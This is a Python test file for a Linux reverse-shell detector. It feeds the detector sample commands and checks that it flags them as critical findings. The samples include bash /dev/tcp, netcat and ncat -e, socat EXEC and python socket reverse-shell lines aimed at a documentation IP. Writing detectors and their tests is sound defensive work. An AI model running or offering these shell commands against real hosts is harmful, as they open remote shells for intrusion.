from src.detection.linux.detection_context import LinuxDetectionContext
from src.detection.linux.reverse_shell_detector import (detect_linux_reverse_shells,)
from src.models.linux_process_execution import LinuxProcessExecution


class FakeLinuxEvent:
    def __init__(
        self,
        command="",
        process="",
        user="root",
        source_ip="203.0.113.50",
        hostname="ubuntu-server",
        timestamp="Jul 7 10:00:01",
        message="",
        raw_log="",
    ):
        self.command = command
        self.process = process
        self.user = user
        self.source_ip = source_ip
        self.hostname = hostname
        self.timestamp = timestamp
        self.message = message
        self.raw_log = raw_log


def create_execution(command: str) -> LinuxProcessExecution:
    event = FakeLinuxEvent(command=command,
        process=command.split()[0] if command else "",)

    context = LinuxDetectionContext.from_event(event)

    return LinuxProcessExecution.from_context(context)


def test_detect_bash_reverse_shell():
    executions = [
        create_execution("/bin/bash -i >& /dev/tcp/203.0.113.50/4444 0>&1")
    ]

    findings = detect_linux_reverse_shells(executions)

    assert len(findings) == 1
    assert findings[0].title == "Linux Reverse Shell Detected"
    assert findings[0].severity == "critical"
    assert findings[0].source == "Linux Host Detection"
    assert findings[0].ip == "203.0.113.50"
    assert findings[0].hostname == "ubuntu-server"


def test_detect_netcat_reverse_shell():
    executions = [create_execution("nc -e /bin/sh 203.0.113.50 4444")]

    findings = detect_linux_reverse_shells(executions)

    assert len(findings) == 1


def test_detect_ncat_reverse_shell():
    executions = [create_execution("ncat --exec /bin/bash 203.0.113.50 4444")]

    findings = detect_linux_reverse_shells(executions)

    assert len(findings) == 1


def test_detect_python_reverse_shell():
    executions = [create_execution("python3 -c import socket,subprocess,os")]

    findings = detect_linux_reverse_shells(executions)

    assert len(findings) == 1


def test_detect_socat_reverse_shell():
    executions = [create_execution("socat TCP:203.0.113.50:4444 EXEC:/bin/sh")]

    findings = detect_linux_reverse_shells(executions)

    assert len(findings) == 1


def test_ignore_normal_command():
    executions = [create_execution("/usr/bin/apt update")]

    findings = detect_linux_reverse_shells(executions)

    assert findings == []


def test_ignore_empty_executions():
    findings = detect_linux_reverse_shells([])

    assert findings == []